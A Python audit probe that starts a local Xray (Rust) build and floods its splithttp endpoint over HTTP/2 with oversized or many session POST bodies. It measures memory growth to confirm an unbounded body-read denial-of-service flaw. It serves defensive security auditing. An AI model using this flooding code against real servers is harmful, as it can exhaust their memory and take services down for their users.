"""Round-2 audit probe: splithttp server packet-up body is read into memory with
NO size limit (Go caps via io.LimitReader(scMaxEachPostBytes+1)).

One h2 POST to /<base>/<session>/<seq> with a huge streaming body; the server
runs `body.collect().await` and only checks the size afterwards. Measures RSS.

Usage: python splithttp_probe.py --mb 400
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import struct
import subprocess
import threading
import time
import uuid as uuidlib

import psutil
from h2.config import H2Configuration
from h2.connection import H2Connection
from h2.events import ResponseReceived, StreamReset

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
EXE = os.path.join(ROOT, "target", "release", "xray.exe")
TMP = os.path.join(ROOT, "reports", "audit-2026-10-31-perf-mem-wiring", "round2", "tmp")
UUID = "a3482e88-686a-4a58-8126-99c9df64b7bf"


def cfg(port):
    return {
        "log": {"loglevel": "warning"},
        "inbounds": [{
            "listen": "127.0.0.1", "port": port, "protocol": "vless",
            "settings": {"clients": [{"id": UUID}], "decryption": "none"},
            "streamSettings": {
                "network": "splithttp", "security": "none",
                "splithttpSettings": {"path": "/sh"},
            },
        }],
        "outbounds": [{"protocol": "freedom",
                       "settings": {"finalRules": [{"action": "allow"}]}}],
    }


def start_xray(c, tag):
    os.makedirs(TMP, exist_ok=True)
    p_cfg = os.path.join(TMP, f"cfg-{tag}.json")
    with open(p_cfg, "w", encoding="utf-8") as f:
        json.dump(c, f, indent=2)
    log_path = os.path.join(TMP, f"xray-{tag}.log")
    logf = open(log_path, "wb")
    p = subprocess.Popen([EXE, "run", "-c", p_cfg], stdout=logf,
                         stderr=subprocess.STDOUT, cwd=ROOT)
    time.sleep(2.5)
    if p.poll() is not None:
        raise SystemExit(f"xray died: {log_path}")
    return p, log_path


def sampler(proc, stop, samples, interval=0.1):
    ps = psutil.Process(proc.pid)
    while not stop.is_set():
        try:
            samples.append((time.time(), ps.memory_info().rss / 1048576, ps.num_handles()))
        except psutil.Error:
            break
        time.sleep(interval)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mb", type=int, default=400)
    ap.add_argument("--port", type=int, default=18100)
    ap.add_argument("--concurrency", type=int, default=1)
    ap.add_argument("--sessions", type=int, default=0, help="N unique sessions x 900KB (under the 1MB cap)")
    args = ap.parse_args()
    proc, log = start_xray(cfg(args.port), "splithttp")
    stop = threading.Event()
    samples = []
    threading.Thread(target=sampler, args=(proc, stop, samples), daemon=True).start()
    time.sleep(1.5)
    base = min(s[1] for s in samples[:8])
    stats = []

    def one(idx):
        sock = socket.create_connection(("127.0.0.1", args.port), timeout=10)
        sock.setblocking(False)
        conn = H2Connection(config=H2Configuration(client_side=True, header_encoding="utf-8"))
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        sid = conn.get_next_available_stream_id()
        sess = f"probe{idx}"
        conn.send_headers(sid, [
            (":method", "POST"), (":path", f"/sh/{sess}/1?x_padding=" + "p" * 200), (":scheme", "http"),
            (":authority", f"127.0.0.1:{args.port}"), ("content-type", "application/octet-stream"),
        ], end_stream=False)
        sock.sendall(conn.data_to_send())
        sent = 0
        chunk = b"Z" * 262144
        total = args.mb * 1024 * 1024
        t0 = time.time()
        status = None
        while sent < total and time.time() - t0 < 40:
            # non-blocking drain of WINDOW_UPDATE / responses
            while True:
                try:
                    data = sock.recv(262144)
                except BlockingIOError:
                    break
                except OSError as e:
                    print(f"[client{idx}] recv err {e}")
                    data = b""
                    status = status or "closed"
                    break
                if not data:
                    break
                for ev in conn.receive_data(data):
                    if isinstance(ev, ResponseReceived):
                        status = ev.headers
                out = conn.data_to_send()
                if out:
                    try:
                        sock.sendall(out)
                    except BlockingIOError:
                        pass
            try:
                win = conn.local_flow_control_window(sid)
            except Exception:
                break
            if win <= 0:
                time.sleep(0.02)
                continue
            take = min(win, 16384, total - sent)
            try:
                conn.send_data(sid, chunk[:take], end_stream=False)
            except Exception as e:  # stream closed by server
                print(f"[client{idx}] send_data stop: {type(e).__name__} {e}")
                break
            sent += take
            out = conn.data_to_send()
            while out:
                try:
                    n = sock.send(out)
                    out = out[n:]
                except BlockingIOError:
                    time.sleep(0.001)
                except OSError as e:
                    print(f"[client{idx}] send err {e}")
                    out = b""
                    status = status or "closed"
                    break
        stats.append((sent, status, time.time() - t0))
        print(f"[client{idx}] sent={sent/1048576:.1f}MB in {time.time()-t0:.1f}s status={status}")
        # hold the stream open so the server keeps the collected body
        time.sleep(2)
        sock.close()

    def safe(i):
        try:
            one(i)
        except Exception as e:
            print(f"[client{i}] failed: {type(e).__name__} {e}")

    if args.sessions:
        # N unique client-supplied session ids, each POSTing 900KB (< 1MB cap) so the
        # size check passes; sessions are reaped only 30s after creation.
        sock = socket.create_connection(("127.0.0.1", args.port), timeout=10)
        sock.setblocking(False)
        conn = H2Connection(config=H2Configuration(client_side=True, header_encoding="utf-8"))
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        body = b"Q" * (900 * 1024)
        ok = 0
        for i in range(args.sessions):
            sid_ = conn.get_next_available_stream_id()
            conn.send_headers(sid_, [
                (":method", "POST"), (":path", f"/sh/sess{i}/1?x_padding=" + "p" * 200),
                (":scheme", "http"), (":authority", f"127.0.0.1:{args.port}"),
                ("content-type", "application/octet-stream"),
            ], end_stream=False)
            # send body in 16KB frames honouring flow control
            off = 0
            t_start = time.time()
            while off < len(body):
                while True:
                    try:
                        d = sock.recv(262144)
                        if not d:
                            break
                        for ev in conn.receive_data(d):
                            if isinstance(ev, ResponseReceived):
                                ok += 1
                        out = conn.data_to_send()
                        if out:
                            sock.sendall(out)
                    except BlockingIOError:
                        break
                try:
                    win = conn.local_flow_control_window(sid_)
                except Exception:
                    break
                if win <= 0:
                    time.sleep(0.01)
                    continue
                take = min(win, 16384, len(body) - off)
                conn.send_data(sid_, body[off:off + take], end_stream=(off + take >= len(body)))
                off += take
                out = conn.data_to_send()
                while out:
                    try:
                        n = sock.send(out)
                        out = out[n:]
                    except BlockingIOError:
                        time.sleep(0.001)
            print(f"[sessions] posted {i+1}/{args.sessions} in {time.time()-t_start:.2f}s")
        print(f"[sessions] done ok_responses={ok}")
        stats.append((0, "sessions", 0))
    threads = [threading.Thread(target=safe, args=(i,)) for i in range(args.concurrency)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    peak = max(s[1] for s in samples)
    print(f"[splithttp] base_rss={base:.1f}MB peak_rss={peak:.1f}MB delta={peak-base:+.1f}MB "
          f"concurrency={args.concurrency} sessions={args.sessions} "
          f"sent={[round(s[0]/1048576,1) for s in stats]}MB "
          f"per_session={(peak-base)*1024/max(args.sessions,1):.0f}KB")
    time.sleep(2)
    print(f"[splithttp] after 2s rss={samples[-1][1]:.1f}MB")
    stop.set()
    path = os.path.join(TMP, "samples-splithttp.tsv")
    with open(path, "w", encoding="utf-8") as f:
        f.write("t\trss_mb\thandles\n")
        t0 = samples[0][0]
        for t, r, h in samples:
            f.write(f"{t-t0:.2f}\t{r:.2f}\t{h}\n")
    print("samples:", path)
    proc.terminate()
    proc.wait(10)
    print("log:", log)


if __name__ == "__main__":
    main()
